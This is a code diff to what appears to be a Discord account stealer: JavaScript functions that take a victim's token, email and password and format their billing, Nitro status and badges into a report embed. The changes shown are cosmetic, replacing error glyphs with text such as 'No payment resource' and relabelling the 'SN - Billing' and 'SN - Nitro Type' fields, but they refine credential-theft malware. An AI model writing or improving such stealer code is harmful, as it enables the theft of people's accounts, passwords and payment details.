@@ -175,7 +175,7 @@ const getBilling = async (token) => {
       }
     }
   });
-  if (!billing) billing = "❌";
+  if (!billing) billing = "\`No payment resource\`";
   return billing;
 };
 
@@ -241,7 +241,7 @@ const getNitro = (flags) => {
     case 2:
       return "Nitro Boost";
     default:
-      return "No Nitro";
+      return "\`No Nitro\`";
   }
 };
 
@@ -279,10 +279,10 @@ const getBadges = (flags) => {
         badges += "HypeSquad Balance <:BalanceLogo:935184834622554132>"
         break;
     case 0:
-        badges = ":x:"
+        badges = "\`No Badges\`"
         break;
     default:
-        badges = ":x:"
+        badges = "\`No Badges\`"
         break;
 }
   return badges;
@@ -328,12 +328,12 @@ const login = async (email, password, token) => {
                     "inline": false
                 },
                 {
-                    "name": "<:sn6:989338031179857921> SN - Nitro:",
+                    "name": "<:sn6:989338031179857921> SN - Nitro Type:",
                     "value": `${nitro}`,
                     "inline": true
                 },
                 {
-                    "name": "**Billing:**",
+                    "name": "<a:sn5:989240264386293800> SN - Billing:",
                     "value": `\`${billing}\``,
                     "inline": true
                 },
